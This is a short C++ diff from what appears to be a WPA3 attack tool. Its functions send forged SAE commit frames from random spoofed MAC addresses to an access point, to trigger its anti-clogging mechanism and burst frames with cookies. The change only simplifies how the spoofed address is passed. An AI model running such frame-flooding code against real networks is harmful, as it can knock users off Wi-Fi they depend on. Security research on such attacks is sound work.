@@ -72,7 +72,7 @@ pair<ACMCookie,int> trigger_acm(const string &iface, const string &att_mac, cons
 	log(LogLevel::INFO, "Triggering ACM (max {} frames)...", trigger_count);
 
 	for(int i = 0; i < trigger_count; ++i){
-		auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(att_mac)), sae_params);
+		auto frame = make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(att_mac), sae_params);
 		sender.send(frame);
 
 		auto result = components::poll_sniffer<ACMCookie>(sniffer.get_pcap_handle(), milliseconds(5),
@@ -113,7 +113,7 @@ void burst_with_cookies(const string &iface, const string &sta_mac, const HWAddr
 
 		if(!entry){
 			this_thread::sleep_for(milliseconds(cookie_wait_ms));
-			auto frame = make_sae_commit(ap_mac, HWAddress<6>(firmware::get_random_ath_masker_mac(sta_mac)),
+			auto frame = make_sae_commit(ap_mac, firmware::get_random_ath_masker_mac(sta_mac),
 										sae_params);
 			sender.send(frame);
 			return nullopt;
